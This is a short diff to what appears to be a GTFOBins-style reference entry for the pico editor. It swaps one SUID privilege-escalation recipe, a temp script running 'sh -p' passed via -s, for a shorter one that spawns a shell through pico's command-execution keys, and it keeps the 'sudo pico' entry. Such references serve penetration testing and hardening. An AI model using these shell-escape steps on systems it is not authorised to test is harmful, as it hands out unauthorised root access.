@@ -20,12 +20,9 @@ functions:
   suid:
     - description: The `SPELL` environment variable can be used in place of the `-s` option if the command line cannot be changed.
       code: |
-        TF=$(mktemp)
-        echo '#!/bin/sh -p
-        exec sh -p' > $TF
-        chmod +x $TF
-        ./pico -s $TF /etc/hosts
-        ^T
+        ./pico
+        ^R^X
+        reset; sh 1>&0 2>&0
   sudo:
     - code: |
         sudo pico
